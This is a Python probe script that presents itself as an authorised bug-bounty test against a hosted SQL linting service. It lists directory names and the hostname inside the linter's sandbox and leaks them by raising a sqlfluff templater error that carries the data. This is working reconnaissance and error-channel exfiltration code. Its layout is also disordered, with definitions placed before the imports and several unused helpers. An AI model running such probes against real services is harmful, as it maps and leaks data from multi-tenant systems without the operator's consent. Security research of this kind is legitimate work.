MARKER = 'A145F9_R6_1B2047C13A46'

def _safe_uid(p):
    try:
        return os.stat(p).st_uid
    except Exception:
        return -1
"""Authorised security-research probe (Bugcrowd dbtlabs-mbb-og1, safe harbour).
Reads process-local directory NAMES, and the content of files whose names
this researcher chose and planted. No environment variables, no network,
no instance metadata, no credentials, no foreign file content."""
import json, os, time
from sqlfluff.core.errors import SQLTemplaterError
CANARY = 'CLEAVE_CANARY_1b2047c13a46.txt'
HOLD = 5
out = {}

def _mine():
    parts = os.getcwd().rstrip('/').split('/')
    return parts[-2] if len(parts) >= 2 else ''

# Bound the refute: what else is inside the lint chroot at all? Top-level
# NAMES only, so "the only tenant-specific directory reachable is /tmp/jobs"
# is a measurement rather than an assumption.
try:
    out["host"] = __import__("socket").gethostname()
    for base in ("/", "/var", "/opt", "/srv", "/mnt", "/data", "/dev"):
        try:
            es = sorted(os.listdir(base))
            named = [e[:24] for e in es if not e.isdigit()]
            out["ls_" + base.strip("/") or "root"] = named[:40]
            out["n_" + (base.strip("/") or "root")] = len(es)
        except Exception as exc:
            out["ls_" + (base.strip("/") or "root")] = "ERR:" + type(exc).__name__
    try:
        out["ls_venv"] = sorted(os.listdir("/venv"))[:20]
    except Exception as exc:
        out["ls_venv"] = "ERR:" + type(exc).__name__
except Exception as exc:
    out["err"] = type(exc).__name__ + ":" + str(exc)[:160]
raise SQLTemplaterError(MARKER + ' ' + json.dumps(out, sort_keys=True))
